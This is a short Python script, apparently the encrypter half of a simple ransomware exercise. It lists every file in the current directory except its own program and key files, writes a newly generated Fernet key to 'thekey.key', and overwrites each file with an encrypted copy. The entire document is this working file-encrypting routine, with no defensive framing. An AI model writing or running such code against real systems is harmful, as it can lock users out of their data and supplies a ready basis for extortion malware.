#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

#initializing files as a list
files = []
#these are key program files that should not be encrypted
notouch = ["main.py", "decrypter.py", "encrypter.py", "thekey.key"]

#iterate over every file in the directory
for file in os.listdir():
		if file in notouch: #skip over the previously established key files
			continue
		if os.path.isfile(file): #all other files are seperated into a list
			files.append(file)
print(files)

key = Fernet.generate_key() #generate key
#print(key)

with open("thekey.key", "wb") as thekey:
	thekey.write(key) 

for file in files: #iterate over the files list and encrypt them
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
